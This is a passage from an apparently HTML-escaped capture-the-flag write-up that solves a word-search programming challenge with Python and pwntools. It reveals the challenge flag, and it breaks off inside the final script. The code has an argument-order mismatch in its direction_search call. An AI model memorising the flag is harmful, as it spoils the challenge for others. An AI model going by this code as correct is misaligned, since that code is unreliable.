&lt;p&gt;Now that we have our grid and words in a format we can process, it’s time to create the searching functions. While I’m sure there are super fast algorithms specifically designed to solve this problem, we’re going to stick with the naïve solution: go through every coordinate that matches the first letter of the word and search out from all eight directions to see if the rest of it matches. Here we have two components to design, the function to search through the entire grid, and the function to search out from a position to determine if the word matches. I’ve implemented them both in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3&lt;/code&gt;, as seen below:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;c1&quot;&gt;# Search from a given (x,y) position out a given direction
#   and return the positions of matching characters.
#   Returns an empty list `[]` if the match fails.
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;direction_search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;grid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x_delta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y_delta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;tiles&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# If this tile doesn't match the current character,
&lt;/span&gt;        &lt;span class=&quot;c1&quot;&gt;#   return an empty list. 
&lt;/span&gt;        &lt;span class=&quot;c1&quot;&gt;# The position also wraps around the edges of the grid.
&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;grid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;grid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)][&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;grid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;# If we're still matching, add this position as an
&lt;/span&gt;            &lt;span class=&quot;c1&quot;&gt;#   (x, y) tuple to the position list.
&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;tiles&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# Move in the given direction
&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y_delta&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x_delta&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tiles&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Search each tile in the grid and determine if the word is found
#   in any 8 directions from each tile.
# Returns list of positions if the word is found, empty list `[]`,
#   if not.
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;word_search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;grid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;enumerate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;grid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;enumerate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;# If this tile matches the first letter of the word, then
&lt;/span&gt;            &lt;span class=&quot;c1&quot;&gt;#   check if the rest of the word is found in any of the 
&lt;/span&gt;            &lt;span class=&quot;c1&quot;&gt;#   8 directions from this position.
&lt;/span&gt;            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x_delta&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y_delta&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;search&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;direction_search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;grid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x_delta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y_delta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally, we can combine all of these elements in the final script and run it to solve the challenge to receive the flag: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag{ac670e1f34da9eb748b3f241eb03f51b}&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;direction_search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;grid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x_delta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y_delta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;tiles&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;grid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;grid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)][&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;grid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;tiles&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y_delta&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x_delta&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tiles&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;word_search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;grid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;enumerate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;grid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;enumerate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x_delta&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y_delta&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;search&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;direction_search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;grid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x_delta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y_delta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# Connect to the challenge server
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;io&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'challenge.ctf.games'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;# Start a game
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'play'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# Skip header lines
&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;# Process grid
&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;grid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;grid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;# Skip trailing lines
&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;# Answer questions
&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
